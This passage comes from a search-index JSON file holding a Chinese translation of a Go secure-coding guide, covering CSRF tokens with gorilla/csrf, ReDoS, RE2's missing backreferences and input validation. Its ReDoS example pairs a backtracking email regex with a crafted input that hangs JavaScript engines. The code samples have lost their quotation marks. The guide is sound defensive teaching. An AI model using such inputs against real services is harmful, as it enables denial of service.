\u7136\u540e\uff0c\u5f53\u63d0\u4ea4\u8868\u5355\u65f6\uff0c\u9690\u85cf\u5b57\u6bb5\u4e0e\u5176\u4ed6\u7528\u6237\u8f93\u5165\u4e00\u8d77\u53d1\u9001\u3002 \u670d\u52a1\u5668\u9a8c\u8bc1\uff0c\u4ee4\u724c\u662f\u5426\u662f\u8bf7\u6c42\u6570\u636e\u7684\u4e00\u90e8\u5206\uff0c\u662f\u5426\u6709\u6548\u3002 \u8be5\u968f\u673a\u6570/token\u5e94\u7b26\u5408\u4ee5\u4e0b\u8981\u6c42\uff1a \u6bcf\u4e2a\u7528\u6237\u4f1a\u8bdd\u552f\u4e00 \u5927\u7684\u968f\u673a\u503c \u7531\u52a0\u5bc6\u5b89\u5168\u968f\u673a\u6570\u751f\u6210\u5668\u751f\u6210 \u6ce8\u610f\uff1a \u867d\u7136 HTTP GET \u8bf7\u6c42\u4e0d\u4f1a\u6539\u53d8\u72b6\u6001(\u79f0\u4e3a\u5e42\u7b49)\uff0c\u4f46\u662f\u7531\u4e8e\u7cdf\u7cd5\u7684\u7f16\u7a0b\u5b9e\u8df5\uff0c\u5b83\u4eec\u5b9e\u9645\u4e0a\u53ef\u4ee5\u4fee\u6539\u8d44\u6e90\uff0c\u56e0\u6b64\u4e5f\u5e94\u8be5\u6210\u4e3aCSRF\u653b\u51fb\u7684\u76ee\u6807\u3002 \u5728\u5904\u7406API\u65f6\uff0c PUT \u548c DELETE \u662fCSRF\u653b\u51fb\u7684\u53e6\u5916\u4e24\u4e2a\u5e38\u89c1\u76ee\u6807\u3002 \u7ec3\u4e60 \u624b\u5de5\u5b8c\u6210\u8fd9\u4e00\u5207\u4e0d\u662f\u4e00\u4e2a\u597d\u4e3b\u610f\uff0c\u56e0\u4e3a\u5b83\u5f88\u5bb9\u6613\u51fa\u9519\u3002 \u5927\u591a\u6570Web\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5df2\u7ecf\u63d0\u4f9b\u4e86\u5f00\u7bb1\u5373\u7528\u7684\u529f\u80fd\uff0c\u5efa\u8bae\u60a8\u542f\u7528\u5b83\uff0c\u6216\u8005\uff0c\u4e0d\u4f7f\u7528\u6846\u67b6\uff0c\u5355\u72ec\u4f7f\u7528\u5b83\u3002 \u4ee5\u4e0b\u793a\u4f8b\u662f\u7528\u4e8ego\u7f16\u7a0b\u8bed\u8a00\u7684 Gorilla web\u5de5\u5177\u5305 \u7684\u4e00\u90e8\u5206\u3002\u4f60\u53ef\u4ee5\u5728GitHub\u4e0a\u627e\u5230 gorilla/csrf \u3002 package main import ( net/http github.com/gorilla/csrf github.com/gorilla/mux ) func main() { r := mux.NewRouter() r.HandleFunc( /signup , ShowSignupForm) // All POST requests without a valid token will return HTTP 403 Forbidden. r.HandleFunc( /signup/post , SubmitSignupForm) // Add the middleware to your router by wrapping it. http.ListenAndServe( :8000 , csrf.Protect([]byte( 32-byte-long-auth-key ))(r)) // PS: Don't forget to pass csrf.Secure(false) if you're developing locally // over plain HTTP (just don't leave it on in production). } func ShowSignupForm(w http.ResponseWriter, r *http.Request) { // signup_form.tmpl just needs a {{ .csrfField }} template tag for // csrf.TemplateField to inject the CSRF token into. Easy! t.ExecuteTemplate(w, signup_form.tmpl , map[string]interface{}{ csrf.TemplateTag: csrf.TemplateField(r), }) // We could also retrieve the token directly from csrf.Token(r) and // set it in the request header - w.Header.Set( X-CSRF-Token , token) // This is useful if you're sending JSON to clients or a front-end JavaScript // framework. } func SubmitSignupForm(w http.ResponseWriter, r *http.Request) { // We can trust that requests making it this far have satisfied // our CSRF protection requirements. } OWASP\u6709\u4e00\u4e2a\u8be6\u7ec6\u7684 \u8de8\u7ad9\u70b9\u8bf7\u6c42\u4f2a\u9020(CSRF)\u9884\u9632\u5907\u5fd8\u5355 \uff0c\u5efa\u8bae\u4f60\u9605\u8bfb\u3002 \u6b63\u5219\u8868\u8fbe\u5f0f \u6b63\u5219\u8868\u8fbe\u5f0f\u662f\u4e00\u79cd\u5e7f\u6cdb\u7528\u4e8e\u641c\u7d22\u548c\u9a8c\u8bc1\u7684\u5f3a\u5927\u5de5\u5177\u3002\u5728web\u5e94\u7528\u7a0b\u5e8f\u4e0a\u4e0b\u6587\u4e2d\uff0c\u5b83\u4eec\u901a\u5e38\u7528\u4e8e\u8f93\u5165\u9a8c\u8bc1\uff08\u4f8b\u5982\u7535\u5b50\u90ae\u4ef6\u5730\u5740\uff09\u3002 \u6b63\u5219\u8868\u8fbe\u5f0f\u662f\u4e00\u79cd\u7528\u4e8e\u63cf\u8ff0\u5b57\u7b26\u4e32\u96c6\u7684\u8868\u793a\u6cd5\u3002\u5f53\u7279\u5b9a\u5b57\u7b26\u4e32\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u63cf\u8ff0\u7684\u96c6\u5408\u4e2d\u65f6\uff0c\u6211\u4eec\u7ecf\u5e38\u8bf4\u6b63\u5219\u8868\u8fbe\u5f0f\u4e0e\u5b57\u7b26\u4e32\u5339\u914d\u3002( \u6765\u6e90 ) \u6240\u5468\u77e5\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u5f88\u96be\u638c\u63e1\u3002\u6709\u65f6\uff0c\u770b\u4f3c\u7b80\u5355\u7684\u9a8c\u8bc1\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4 \u62d2\u7edd\u670d\u52a1 \u3002 \u4e0e\u5176\u4ed6\u7f16\u7a0b\u8bed\u8a00\u4e0d\u540c\uff0cGo\u7684\u4f5c\u8005\u5bf9\u6b64\u975e\u5e38\u91cd\u89c6\uff0c\u4ed6\u9009\u62e9\u7528 RE2 \u6765\u5b9e\u73b0 regex\u6807\u51c6\u5305 \u3002 \u4e3a\u4ec0\u4e48\u662fRE2 RE2\u7684\u8bbe\u8ba1\u548c\u5b9e\u73b0\u5177\u6709\u4e00\u4e2a\u660e\u786e\u7684\u76ee\u6807\uff0c\u5373\u80fd\u591f\u5728\u6ca1\u6709\u98ce\u9669\u7684\u60c5\u51b5\u4e0b\uff0c\u5904\u7406\u6765\u81ea\u4e0d\u53d7\u4fe1\u4efb\u7528\u6237\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u3002( \u6765\u6e90 ) \u8003\u8651\u5230\u5b89\u5168\u6027\uff0cRE2\u8fd8\u4fdd\u8bc1\u4e86\u7ebf\u6027\u65f6\u95f4\u6027\u80fd\u548c\u4f18\u96c5\u7684\u5931\u8d25\uff1a\u89e3\u6790\u5668\u3001\u7f16\u8bd1\u5668\u548c\u6267\u884c\u5f15\u64ce\u53ef\u7528\u7684\u5185\u5b58\u662f\u6709\u9650\u7684\u3002 \u6b63\u5219\u8868\u8fbe\u5f0f\u62d2\u7edd\u670d\u52a1\u653b\u51fb \u6b63\u5219\u8868\u8fbe\u5f0f\u62d2\u7edd\u670d\u52a1(ReDoS)\u662f\u4e00\u79cd\u5f15\u53d1\u62d2\u7edd\u670d\u52a1(DoS)\u7684\u7b97\u6cd5\u590d\u6742\u5ea6\u653b\u51fb\u3002ReDos\u653b\u51fb\u662f\u7531\u6b63\u5219\u8868\u8fbe\u5f0f\u5f15\u8d77\u7684\uff0c\u8be5\u8868\u8fbe\u5f0f\u9700\u8981\u5f88\u957f\u65f6\u95f4\u6765\u8fdb\u884c\u8ba1\u7b97\uff0c\u5176\u8ba1\u7b97\u65f6\u95f4\u4e0e\u8f93\u5165\u5927\u5c0f\u5448\u6307\u6570\u7ea7\u76f8\u5173\u3002\u5728\u8ba1\u7b97\u8fc7\u7a0b\u4e2d\uff0c\u8fd9\u4e00\u5f02\u5e38\u957f\u7684\u65f6\u95f4\u662f\uff0c\u7531\u4e8e\u4f7f\u7528\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5b9e\u73b0\u7b97\u6cd5\uff0c\u4f8b\u5982\u9012\u5f52\u56de\u6eaf\u8868\u8fbe\u5f0f\u3002( \u6765\u6e90 ) \u4f60\u6700\u597d\u9605\u8bfb\u5b8c\u6574\u7684\u6587\u7ae0\u201c \u6df1\u5165\u7814\u7a76Go\u4e2d\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u62d2\u7edd\u670d\u52a1(ReDoS) )\u201d\uff0c\u56e0\u4e3a\u5b83\u6df1\u5165\u7814\u7a76\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u5e76\u5305\u542b\u4e86\u5927\u591a\u6570\u6d41\u884c\u7684\u7f16\u7a0b\u8bed\u8a00\u4e4b\u95f4\u7684\u6bd4\u8f83\u3002\u5728\u672c\u8282\u4e2d\uff0c\u6211\u4eec\u5c06\u5173\u6ce8\u4e00\u4e2a\u771f\u5b9e\u4e16\u754c\u7684\u7528\u4f8b\u3002 \u7531\u4e8e\u67d0\u4e9b\u539f\u56e0\uff0c\u4f60\u6b63\u5728\u5bfb\u627e\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u9a8c\u8bc1\u6ce8\u518c\u8868\u5355\u4e0a\u63d0\u4f9b\u7684\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u3002\u5728\u5feb\u901f\u641c\u7d22\u4e4b\u540e\uff0c\u4f60\u5728RegExLib.com\u4e0a\u627e\u5230\u4e86\u8fd9\u4e2a\u7528\u4e8e \u7535\u5b50\u90ae\u4ef6\u9a8c\u8bc1\u7684\u6b63\u5219\u8868\u8fbe\u5f0f \uff1a ^([a-zA-Z0-9])(([\\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$ \u5982\u679c\u4f60\u5c1d\u8bd5\u5c06john.doe@somehost.com\u4e0e\u6b64\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\uff0c\u60a8\u53ef\u80fd\u4f1a\u786e\u4fe1\u5b83\u80fd\u591f\u6ee1\u8db3\u4f60\u7684\u9700\u6c42\u3002 \u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528Go\u5f00\u53d1\uff0c\u4f60\u4f1a\u60f3\u51fa\u7c7b\u4f3c\u7684\u4e1c\u897f\uff1a package main import ( fmt regexp ) func main() { testString1 := john.doe@somehost.com testString2 := aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa! regex := regexp.MustCompile( ^([a-zA-Z0-9])(([\\\\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$ ) fmt.Println(regex.MatchString(testString1)) // expected output: true fmt.Println(regex.MatchString(testString2)) // expected output: false } \u8fd0\u884c\u7ed3\u679c\uff1a $ go run src/redos.go true false \u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528JavaScript\u5f00\u53d1\u5462? const testString1 = 'john.doe@somehost.com'; const testString2 = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'; const regex = /^([a-zA-Z0-9])(([\\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$/; console.log(regex.test(testString1)); // expected output: true console.log(regex.test(testString2)); // expected output: hang/FATAL EXCEPTION \u5c11\u4e86\u4ec0\u4e48 \u5982\u679c\u60a8\u5177\u6709\u5176\u4ed6\u7f16\u7a0b\u8bed\u8a00(\u5982Perl\u3001Python\u3001PHP\u6216JavaScript)\u7684\u80cc\u666f\uff0c\u5219\u5e94\u8be5\u4e86\u89e3\u6b63\u5219\u8868\u8fbe\u5f0f\u652f\u6301\u7684\u7279\u6027\u4e4b\u95f4\u7684\u5dee\u5f02\u3002 RE2\u4e0d\u652f\u6301\u53ea\u6709\u56de\u6eaf\u89e3\u51b3\u65b9\u6848\u5b58\u5728\u7684\u6784\u9020\uff0c\u4f8b\u5982 \u56de\u6eaf\u5f15\u7528 \u548c \u67e5\u627e \u3002 \u8003\u8651\u4ee5\u4e0b\u95ee\u9898\uff1a\u9a8c\u8bc1\u4efb\u610f\u5b57\u7b26\u4e32\u662f\u5426\u662f\u683c\u5f0f\u6b63\u786e\u7684HTML\u6807\u8bb0\uff1aa)\u5f00\u59cb\u548c\u7ed3\u675f\u6807\u8bb0\u540d\u79f0\u5339\u914d\uff0cb)\u5f00\u59cb\u548c\u7ed3\u675f\u6807\u8bb0\u4e4b\u95f4\u53ef\u4ee5\u6709\u4e00\u4e9b\u6587\u672c\u3002 \u6ee1\u8db3\u8981\u6c42b)\u5f88\u7b80\u5355 .*? \uff0c\u4f46\u662fa)\u5177\u6709\u6311\u6218\u6027\uff0c\u56e0\u4e3a\u7ed3\u675f\u6807\u8bb0\u5339\u914d\u53d6\u51b3\u4e8e\u5339\u914d\u7684\u5f00\u5934\u6807\u8bb0\u3002 \u8fd9\u6b63\u662fBackreferences\u5141\u8bb8\u6211\u4eec\u505a\u7684\u4e8b\u60c5\u3002 \u68c0\u67e5\u4e0b\u9762\u7684JavaScript\u5b9e\u73b0\uff1a const testString1 = ' h1 Go Secure Coding Practices Guide /h1 '; const testString2 = ' p Go Secure Coding Practices Guide /p '; const testString3 = ' h1 Go Secure Coding Practices Guid /p '; const regex = / ([a-z][a-z0-9]*)\\b[^ ]* .*? \\/\\1 /; console.log(regex.test(testString1)); // expected output: true console.log(regex.test(testString2)); // expected output: true console.log(regex.test(testString3)); // expected output: false \\1 \u5c06\u4fdd\u5b58 ([A-Z][A-Z0-9]*) \u5148\u524d\u6355\u83b7\u7684\u503c\u3002 \u8fd9\u662f\u4f60\u4e0d\u5e94\u8be5\u671f\u671b\u5728Go\u4e2d\u505a\u7684\u4e8b\u60c5\uff1a package main import ( fmt regexp ) func main() { testString1 := h1 Go Secure Coding Practices Guide /h1 testString2 := p Go Secure Coding Practices Guide /p testString3 := h1 Go Secure Coding Practices Guid /p regex := regexp.MustCompile( ([a-z][a-z0-9]*)\\b[^ ]* .*? \\/\\1 ) fmt.Println(regex.MatchString(testString1)) fmt.Println(regex.MatchString(testString2)) fmt.Println(regex.MatchString(testString3)) } \u8fd0\u884c\u4e0a\u9762\u7684Go\u6e90\u4ee3\u7801\u793a\u4f8b\u5e94\u8be5\u4f1a\u5bfc\u81f4\u4ee5\u4e0b\u9519\u8bef\uff1a $ go run src/backreference.go # command-line-arguments src/backreference.go:12:64: unknown escape sequence src/backreference.go:12:67: non-octal character in escape sequence: \u4f60\u53ef\u80fd\u4f1a\u60f3\u8981\u4fee\u590d\u8fd9\u4e9b\u9519\u8bef\uff0c\u5e76\u63d0\u51fa\u4ee5\u4e0b\u6b63\u5219\u8868\u8fbe\u5f0f\uff1a ([a-z][a-z0-9]*)\\b[^ ]* .*? \\\\/\\\\1 \u7136\u540e\uff0c\u4f60\u5c06\u5f97\u5230\uff1a go run src/backreference.go panic: regexp: Compile( ([a-z][a-z0-9]*)\\b[^ ]* .*? \\\\/\\\\1 ): error parsing regexp: invalid escape sequence: `\\1` goroutine 1 [running]: regexp.MustCompile(0x4de780, 0x21, 0xc00000e1f0) /usr/local/go/src/regexp/regexp.go:245 +0x171 main.main() /go/src/backreference.go:12 +0x3a exit status 2 \u5728\u4ece\u5934\u5f00\u59cb\u5f00\u53d1\u4e00\u4e9b\u4e1c\u897f\u65f6\uff0c\u4f60\u53ef\u80fd\u4f1a\u5728\u7f3a\u5c11\u4e00\u4e9b\u7279\u6027\u65f6\uff0c\u53d1\u73b0\u5f88\u597d\u7684\u89e3\u51b3\u65b9\u6848\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u79fb\u690d\u73b0\u6709\u8f6f\u4ef6\uff0c\u4f60\u53ef\u80fd\u4f1a\u5bfb\u627e\u6807\u51c6\u6b63\u5219\u8868\u8fbe\u5f0f\u5305\u7684\u5b8c\u6574\u529f\u80fd\u66ff\u4ee3\u65b9\u6848\uff0c\u53ef\u80fd\u4f1a\u627e\u5230(\u4f8b\u5982\uff1a dlclark / regexp2 )\u3002\u8bf7\u8bb0\u4f4f\uff0c\u4f60\u53ef\u80fd\u4f1a\u5931\u53bbRE2\u7684\u201c\u5b89\u5168\u7279\u6027\u201d\uff0c\u6bd4\u5982\u7ebf\u6027\u65f6\u95f4\u6027\u80fd\u3002","title":"Go\u8bed\u8a00\u5b89\u5168\u7f16\u7801\u89c4\u8303-\u7ffb\u8bd1"},{"location":"application-security/sdl/go-scp/#go-","text":"\u82f1\u6587\u5730\u5740 \u7ffb\u8bd1\uff1ablood_zer0\u3001 Lingfighting \u5982\u679c\u7ffb\u8bd1\u7684\u6709\u95ee\u9898\uff1a\u8054\u7cfb\u6211(Lzero2012)\u3002\u5306\u5fd9\u7ffb\u8bd1\u80af\u5b9a\u4f1a\u6709\u5f88\u591a\u9519\u8bef\uff0c\u6b22\u8fce\u5927\u5bb6\u4e00\u8d77\u8ba8\u8bbaGo\u8bed\u8a00\u5b89\u5168\u80fd\u529b\u5efa\u8bbe\u3002 \u8f6c\u8f7d\u8bf7\u8d34\u4e0a\u539f\u94fe\u63a5","title":"Go\u8bed\u8a00\u5b89\u5168\u7f16\u7801\u89c4\u8303-\u7ffb\u8bd1"},{"location":"application-security/sdl/go-scp/#_1","text":"Go\u8bed\u8a00-Web\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u7f16\u7801\u5b9e\u8df5\u662f\u4e3a\u4e86\u7ed9\u4efb\u4f55\u4f7f\u7528Go\u8fdb\u884c\u7f16\u7a0b\u4e0eWeb\u5f00\u53d1\u7684\u4eba\u5458\u63d0\u4f9b\u6307\u5bfc\u3002 \u8fd9\u672c\u4e66\u662f Checkmarx\u5b89\u5168\u7814\u7a76\u56e2\u961f \u5171\u540c\u52aa\u529b\u7684\u7ed3\u6676\uff0c\u5b83\u9075\u5faa OWASP\u5b89\u5168\u7f16\u7801\u5b9e\u8df5\u5feb\u901f\u53c2\u8003\u6307\u5357 \u3002 \u8fd9\u672c\u4e66\u4e3b\u8981\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u5e2e\u52a9\u5f00\u53d1\u4eba\u5458\u907f\u514d\u5e38\u89c1\u9519\u8bef\uff0c\u540c\u65f6\u901a\u8fc7\"\u5b9e\u8df5\u65b9\u6cd5\"\u5b66\u4e60\u7f16\u7a0b\u8bed\u8a00\u5fc3\u5f97\u3002\u672c\u4e66\u63d0\u4f9b\u4e86\u5173\u4e8e\"\u5982\u4f55\u5b89\u5168\u6267\u884c\"\u8be6\u7ec6\u4fe1\u606f\uff0c\u5c55\u793a\u4e86\u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u51fa\u73b0\u7684\u5b89\u5168\u95ee\u9898\u3002","title":"\u4ecb\u7ecd"},{"location":"application-security/sdl/go-scp/#checkmarx","text":"Checkmarx \u662f\u4e00\u5bb6\u5e94\u7528\u7a0b\u5e8f\u8f6f\u4ef6\u5b89\u5168\u516c\u53f8\uff0c\u516c\u53f8\u4f7f\u547d\u662f\u4e3a\u4f01\u4e1a\u7ec4\u7ec7\u63d0\u4f9b\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5\u4ea7\u54c1\u4e0e\u670d\u52a1\uff0c\u63d0\u9ad8\u5f00\u53d1\u4eba\u5458\u4ea4\u4ed8\u5b89\u5168\u5e94\u7528\u7a0b\u5e8f\u3002\u62e5\u67091000\u5bb6\u5ba2\u670d\u5305\u62ec\u5168\u7403\u5341\u5927\u8f6f\u4ef6\u4f9b\u5e94\u5546\u4e2d\u7684\u7269\u4ef7\uff0c\u7f8e\u56fd\u9876\u7ea7\u94f6\u884c\u4e2d\u7684\u56db\u5bb6\uff0c\u4ee5\u53ca\u8bb8\u591a\u8d22\u5bcc500\u5f3a\u548c\u653f\u5e9c\u673a\u6784\uff0c\u5305\u62ecSAP\u3001\u4e09\u661f\u548cSalesforce.com \u5173\u4e8eCheckmarx\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u53ef\u4ee5\u8bbf\u95ee checkmarx.com \u6216\u8005\u5173\u6ce8\u6211\u4eec\u7684twitter\uff1a @checkmarx","title":"\u5173\u4e8eCheckmarx"},{"location":"application-security/sdl/go-scp/#owasp","text":"\" \u5b89\u5168\u7f16\u7a0b\u5b9e\u8df5\u5feb\u901f\u53c2\u8003\u6307\u5357 \"\u662f OWASP \u5f00\u6e90Web\u5b89\u5168\u9879\u76ee\u3002\u5b83\u662f\u4e00\u79cd\"\u6280\u672f\u65e0\u5173\u7684\u901a\u7528\u8f6f\u4ef6\u5b89\u5168\u7f16\u7a0b\u5b9e\u8df5\u96c6\uff0c\u91c7\u7528\u5168\u9762\u7684\u5217\u8868\u683c\u5f0f\uff0c\u53ef\u4ee5\u96c6\u6210\u5230\u5f00\u53d1\u751f\u547d\u5468\u671f\u4e2d\" OWASP\u672c\u8eab\u662f\"\u4e00\u4e2a\u5f00\u653e\u7684\u793e\u533a\uff0c\u81f4\u529b\u4e8e\u4f7f\u7ec4\u7ec7\u80fd\u591f\u6784\u601d\u3001\u5f00\u53d1\u3001\u83b7\u53d6\u3001\u64cd\u4f5c\u548c\u7ef4\u62a4\u53ef\u4fe1\u4efb\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u6240\u6709\u7684OWASP\u5de5\u5177\u3001\u6587\u6863\u3001\u8bba\u575b\u548c\u7ae0\u8282\u90fd\u662f\u514d\u8d39\u7684\uff0c\u5e76\u4e14\u5bf9\u4efb\u4f55\u6709\u5174\u8da3\u63d0\u9ad8\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6027\u7684\u4eba\u5f00\u653e\u3002\"","title":"\u5173\u4e8eOWASP\u5b89\u5168\u7f16\u7a0b\u5b9e\u8df5"},{"location":"application-security/sdl/go-scp/#_2","text":"\u5728Web\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6027\u4e2d\uff0c\u5982\u679c\u672a\u5bf9\u7528\u6237\u8f93\u5165\u53ca\u76f8\u5173\u6570\u636e\u8fdb\u884c\u9a8c\u8bc1\u5219\u4f1a\u5b58\u5728\u5b89\u5168\u98ce\u9669\u3002\u6211\u4eec\u901a\u8fc7\"\u8f93\u5165\u9a8c\u8bc1\"\u4e0e\"\u8f93\u51fa\u5904\u7406\"\u6280\u672f\u6765\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u3002\u6839\u636e\u670d\u52a1\u5668\u7684\u529f\u80fd\uff0c\u5e94\u5728\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u4e2a\u5c42\u4e2d\u6267\u884c\u8fd9\u4e9b\u9a8c\u8bc1\u3002\u91cd\u8981\u7684\u4e00\u70b9\u662f\uff0c\u6240\u6709\u6570\u636e\u9a8c\u8bc1\u7a0b\u5e8f\u5fc5\u987b\u5728\u53ef\u4fe1\u7cfb\u7edf\u4e0a\uff08\u5373\u5728\u670d\u52a1\u5668\u4e0a\uff09\u5b8c\u6210\u3002 \u5982\" OWASP SCP\u5feb\u901f\u53c2\u8003\u6307\u5357 \"\u4e2d\u6240\u8ff0\uff0c\u670916\u4e2a\u8981\u70b9\u6db5\u76d6\u4e86\u5f00\u53d1\u4eba\u5458\u5728\u5904\u7406\u8f93\u5165\u9a8c\u8bc1\u65f6\u5e94\u6ce8\u610f\u7684\u95ee\u9898\u3002\u5728\u5f00\u53d1\u5e94\u7528\u7a0b\u5e8f\u65f6\u7f3a\u4e4f\u5bf9\u8fd9\u4e9b\u5b89\u5168\u98ce\u9669\u7684\u8003\u8651\u662f \u6ce8\u5165 \" OWASP Top 10 \"\u4e2d\u6392\u540d\u7b2c\u4e00\u7684\u4e3b\u8981\u539f\u56e0\u4e4b\u4e00\u3002 \u7528\u6237\u4ea4\u4e92\u662fWeb\u5e94\u7528\u7a0b\u5e8f\u5f53\u524d\u5f00\u53d1\u8303\u4f8b\u7684\u4e3b\u8981\u5185\u5bb9\u3002\u968f\u7740Web\u5e94\u7528\u7a0b\u5e8f\u5185\u5bb9\u548c\u53ef\u80fd\u6027\u8d8a\u6765\u8d8a\u4e30\u5bcc\uff0c\u7528\u6237\u4ea4\u4e92\u548c\u63d0\u4ea4\u7684\u7528\u6237\u6570\u636e\u4e5f\u4f1a\u589e\u52a0\u3002\u6b63\u662f\u5728\u8fd9\u79cd\u80cc\u666f\u4e0b\uff0c\u8f93\u5165\u9a8c\u8bc1\u8d77\u7740\u91cd\u8981\u4f5c\u7528\u3002 \u5f53\u5e94\u7528\u7a0b\u5e8f\u5904\u7406\u7528\u6237\u6570\u636e\u65f6\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u63d0\u4ea4\u7684\u6570\u636e\u5fc5\u987b\u88ab\u89c6\u4e3a\u4e0d\u5b89\u5168\uff0c\u5e76\u4e14\u53ea\u6709\u5728\u8fdb\u884c\u4e86\u9002\u5f53\u7684\u5b89\u5168\u68c0\u67e5\u540e\u624d\u80fd\u63a5\u53d7\u3002\u8fd8\u5fc5\u987b\u5c06\u6570\u636e\u6e90\u6807\u8bc6\u4e3a\u53d7\u4fe1\u4efb\u6216\u4e0d\u53d7\u4fe1\u4efb\uff0c\u5e76\u4e14\u5728\u4e0d\u53d7\u4fe1\u4efb\u7684\u6e90\u7684\u60c5\u51b5\u4e0b\uff0c\u5fc5\u987b\u8fdb\u884c\u9a8c\u8bc1\u68c0\u67e5\u3002","title":"\u8f93\u5165\u9a8c\u8bc1"},{"location":"application-security/sdl/go-scp/#_3","text":"\u5728\u9a8c\u8bc1\u68c0\u67e5\u4e2d\uff0c\u6839\u636e\u4e00\u7ec4\u6761\u4ef6\u68c0\u67e5\u7528\u6237\u8f93\u5165\uff0c\u4ee5\u4fdd\u8bc1\u7528\u6237\u786e\u5b9e\u8f93\u5165\u4e86\u9884\u671f\u6570\u636e\u3002 \u91cd\u8981\u4fe1\u606f \uff1a\u5982\u679c\u9a8c\u8bc1\u5931\u8d25\uff0c\u5219\u5fc5\u987b\u62d2\u7edd\u8f93\u5165\u3002 \u8fd9\u4e0d\u4ec5\u4ece\u5b89\u5168\u89d2\u5ea6\u800c\u4e14\u4ece\u6570\u636e\u4e00\u81f4\u6027\u548c\u5b8c\u6574\u6027\u7684\u89d2\u5ea6\u6765\u770b\u5f88\u91cd\u8981\uff0c\u56e0\u4e3a\u6570\u636e\u901a\u5e38\u7528\u4e8e\u5404\u79cd\u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u3002 \u672c\u6587\u5217\u51fa\u4e86\u5f00\u53d1\u4eba\u5458\u5728Go\u4e2d\u5f00\u53d1Web\u5e94\u7528\u7a0b\u5e8f\u65f6\u5e94\u6ce8\u610f\u7684\u5b89\u5168\u98ce\u9669\u3002","title":"\u9a8c\u8bc1"},{"location":"application-security/sdl/go-scp/#_4","text":"\u5141\u8bb8\u7528\u6237\u8f93\u5165\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u4efb\u4f55\u90e8\u5206\u90fd\u5b58\u5728\u6f5c\u5728\u7684\u5b89\u5168\u98ce\u9669\u3002 \u95ee\u9898\u4e0d\u4ec5\u53ef\u80fd\u6765\u81ea\u5bfb\u6c42\u5371\u5bb3\u5e94\u7528\u7a0b\u5e8f\u7684\u65b9\u6cd5\uff0c\u4e5f\u53ef\u80fd\u6765\u81ea\u4eba\u4e3a\u9519\u8bef\u5bfc\u81f4\u7684\u9519\u8bef\u8f93\u5165\uff08\u7edf\u8ba1\u4e0a\uff0c\u5927\u591a\u6570\u65e0\u6548\u6570\u636e\u60c5\u51b5\u901a\u5e38\u662f\u7531\u4eba\u4e3a\u9519\u8bef\u5f15\u8d77\u7684\uff09\u3002 \u5728Go\u4e2d\uff0c\u6709\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u9632\u6b62\u6b64\u7c7b\u95ee\u9898\u3002 Go\u5177\u6709\u672c\u673a\u5e93\uff0c\u5176\u4e2d\u5305\u62ec\u6709\u52a9\u4e8e\u786e\u4fdd\u4e0d\u4f1a\u53d1\u751f\u6b64\u7c7b\u9519\u8bef\u7684\u65b9\u6cd5\u3002 \u5728\u5904\u7406\u5b57\u7b26\u4e32\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u4ee5\u4e0b\u793a\u4f8b\u7684\u5305\uff1a strconv \u5305\u5904\u7406\u5230\u5176\u4ed6\u6570\u636e\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\u8f6c\u6362\u3002 Atoi ParseBool ParseFloat ParseInt strings \u5305\u5305\u542b\u5904\u7406\u5b57\u7b26\u4e32\u53ca\u5176\u5c5e\u6027\u7684\u6240\u6709\u51fd\u6570\u3002 Trim ToLower ToTitle regexp \u5305\u652f\u6301\u6b63\u5219\u8868\u8fbe\u5f0f\u4ee5\u9002\u5e94\u81ea\u5b9a\u4e49\u683c\u5f0f\u3002 utf8 \u5305\u5b9e\u73b0\u51fd\u6570\u548c\u5e38\u91cf\u4ee5\u652f\u6301\u4ee5UTF-8\u7f16\u7801\u7684\u6587\u672c\u3002\u5b83\u5305\u62ec\u5728runes\u548cutf-8\u5b57\u8282\u5e8f\u5217\u4e4b\u95f4\u8f6c\u6362\u7684\u51fd\u6570\u3002 Valid\uff08\u9a8c\u8bc1UTF-8\u7f16\u7801\uff09 ValidRune\uff08\u9a8c\u8bc1UTF-8\u7f16\u7801\uff09 ValidString\uff08\u9a8c\u8bc1UTF-8\u7f16\u7801\uff09 EncodeRune\uff08UTF-8\u7f16\u7801\uff09 DecodeLastRune\uff08UTF-8\u89e3\u7801\uff09 DecodeLastRuneInString\uff08UTF-8\u89e3\u7801\uff09 \u6ce8\u610f 